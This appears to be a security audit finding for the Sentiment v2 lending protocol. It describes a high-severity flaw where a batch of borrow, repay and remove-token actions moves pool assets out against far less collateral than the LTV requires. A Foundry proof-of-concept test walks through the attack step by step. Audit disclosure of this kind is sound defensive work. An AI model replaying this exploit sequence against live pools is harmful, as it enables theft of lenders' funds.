Abundant Hazel Newt

High

# Large amount of pool assets can be transferred to position by providing much less collaterals

## Summary
Large amount of pool assets can be transferred to position by providing much less collaterals.

## Vulnerability Detail
To borrow assets from pool, a user is required to deposit collaterals into the position. The required amount of collaterals is determined by LTV, assuming LTV is $98\\%$, to borrow $1000$ USDC tokens, user should deposit at least $1021$ USDT. However, a malicious user can bypass the limit and transfers large amount of pool assets to position but deposits much less collaterals.

Assume there are 2 pool: 
1. USDC pool which supports USDT as collateral token, LTV is $98\\%$;
2. USDT pool which supports USDC as collateral token, LTV is $98\\%$.

Bob submits a batch process to do the following:
1. Add USDC token address to the set of position assets;
2. Add USDT token address to the set of position assets;
3. Borrow $1000$ USDC tokens from USDC pool;
4. Borrow $1000$ USDT tokens from USDT pool;
5. Repay USDT pool;
6. Remove USDC token address from the set of position assets;
7. Transfer the borrowed $1000$ USDC from the position to Bob's wallet;
8. Deposit $1021$ USDT in position.

After the batch process, we have the following states:

- Bob wallet USDC balance: $1000$
- Bob position USDT balance: $1021$
- Bob position USDC debt: $1000$

Because USDC and USDC are of the same value, it basically means that Bob transfers $1000u$ assets from pool but only deposits $21u$ collaterals.

Please run the PoC in **BigTest.sol** to verify:
```solidity
    function testAudit_TransferAssets() public {
        // Pool Asset 1
        MockERC20 usdc = new MockERC20("USDC", "USDC", 6);
        // Pool Asset 2
        MockERC20 usdt = new MockERC20("USDT", "USDT", 6);

        vm.label(address(usdc), "USDC");
        vm.label(address(usdt), "USDT");

        vm.startPrank(protocolOwner);
        positionManager.toggleKnownAsset(address(usdc));
        positionManager.toggleKnownAsset(address(usdt));
        riskEngine.setOracle(address(usdc), address(new FixedPriceOracle(1e18)));
        riskEngine.setOracle(address(usdt), address(new FixedPriceOracle(1e18)));
        vm.stopPrank();

        // Create Pools and deposit
        address poolOwner = makeAddr("PoolOwner");
        usdc.mint(poolOwner, 1000e6);
        usdt.mint(poolOwner, 1000e6);

        bytes32 FIXED_RATE_MODEL_KEY = 0xeba2c14de8b8ca05a15d7673453a0a3b315f122f56770b8bb643dc4bfbcf326b;

        vm.startPrank(poolOwner);
        usdc.approve(address(pool), type(uint256).max);
        usdt.approve(address(pool), type(uint256).max);

        // Pool 1
        uint256 poolId1 = pool.initializePool(poolOwner, address(usdc), type(uint128).max, FIXED_RATE_MODEL_KEY);
        riskEngine.requestLtvUpdate(poolId1, address(usdt), 0.98e18);
        riskEngine.acceptLtvUpdate(poolId1, address(usdt));
        pool.deposit(poolId1, 1000e6, poolOwner);

        // Pool 2
        uint256 poolId2 = pool.initializePool(poolOwner, address(usdt), type(uint128).max, FIXED_RATE_MODEL_KEY);
        riskEngine.requestLtvUpdate(poolId2, address(usdc), 0.98e18);
        riskEngine.acceptLtvUpdate(poolId2, address(usdc));
        pool.deposit(poolId2, 1000e6, poolOwner);
        vm.stopPrank();

        /*//////////////////////////////////////////////////////////////
                            Attack Path
        //////////////////////////////////////////////////////////////*/

        // Bob creates position
        address bob = makeAddr("Bob");
        usdt.mint(bob, 1021e6);

        (address payable position, Action memory newPos) = newPosition(bob, "bob");
        positionManager.process(position, newPos);

        // Bob borrows from pool1 and pool2
        Action memory addUsdc = addToken(address(usdc));
        Action memory addUsdt = addToken(address(usdt));
        Action memory borrowUsdc = borrow(poolId1, 1000e6);
        Action memory borrowUsdt = borrow(poolId2, 1000e6);
        Action memory repayPool2 = Action({ op: Operation.Repay, data: abi.encode(poolId2, type(uint256).max) });
        Action memory removeUsdc = removeToken(address(usdc));
        Action memory transferOutUsdc = transfer(bob, address(usdc), 1000e6);
        Action memory depositUsdt = deposit(address(usdt), 1021e6);

        Action[] memory actions = new Action[](8);
        actions[0] = addUsdc;
        actions[1] = addUsdt;
        actions[2] = borrowUsdc;
        actions[3] = borrowUsdt;
        actions[4] = repayPool2;
        actions[5] = removeUsdc;
        actions[6] = transferOutUsdc;
        actions[7] = depositUsdt;
    
        vm.startPrank(bob);
        usdt.approve(address(positionManager), 1021e6);
        positionManager.processBatch(position, actions);
        vm.stopPrank();

        assertEq(usdc.balanceOf(bob), 1000e6); // Bob USDC balance
        assertEq(usdt.balanceOf(position), 1021e6); // Bob position USDT balance
        assertEq(pool.getBorrowsOf(poolId1, position), 1000e6); // Bob position USDC debt
    }
```

## Impact
1. Take the same example in the PoC, to transfer **1_000_000** USDC tokens, attacker only need to provide approximately **21_000** USDT collaterals (2%). As a result, A attacker can prevent honest users from borrowing assets, by front-running to transfer all the assets pool to the attacker's position, then back-run to repay in the same block at no costs.
2. Attacker's position can be immediately liquidatable in the next block, when the position is liquidated by the attacker, it's possible that tokens can be stolen from the pool.

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L248-L264

## Tool used
Manual Review

## Recommendation
It is recommended to add more health check within batch process.